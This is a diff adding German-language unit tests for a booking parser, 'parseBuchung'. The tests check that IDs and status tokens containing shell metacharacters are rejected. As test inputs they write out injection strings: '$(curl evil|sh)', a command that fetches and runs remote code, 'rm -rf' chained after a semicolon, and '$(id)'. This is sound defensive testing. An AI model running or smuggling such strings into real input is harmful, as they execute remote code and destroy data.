@@ -68,3 +68,19 @@ describe('parseBuchung', () => {
     expect(() => parseBuchung('QS-PLAN-EINFACH', 'fertig')).toThrow(/ungültiger Wert "fertig"/);
   });
 });
+
+// Gegenprüfungs-Befund 14.8.2026 (Shell-Injection): ID/Token mit Metazeichen
+// werden hart abgewiesen — §6.7-Rotfall der Zeichensatz-Wache.
+describe('parseBuchung — Zeichensatz-Wache (Injection)', () => {
+  it('wirft bei Metazeichen in der ID', () => {
+    expect(() => parseBuchung('$(curl evil|sh)', 'done')).toThrow(/unerlaubte Zeichen/);
+    expect(() => parseBuchung('W2·10;rm -rf', 'done')).toThrow(/unerlaubte Zeichen/);
+  });
+  it('wirft bei Metazeichen im Blocker-Token', () => {
+    expect(() => parseBuchung('QS-DATA', 'parked($(id))')).toThrow(/unerlaubte Zeichen/);
+  });
+  it('lässt echte IDs und Tokens durch', () => {
+    expect(parseBuchung('W2·10-UI-NAV', 'done')).toEqual({ id: 'W2·10-UI-NAV', status: 'done', blocker: null });
+    expect(parseBuchung('QS-DATA', 'parked(vps-bestellung-david)')).toEqual({ id: 'QS-DATA', status: 'parked', blocker: 'vps-bestellung-david' });
+  });
+});
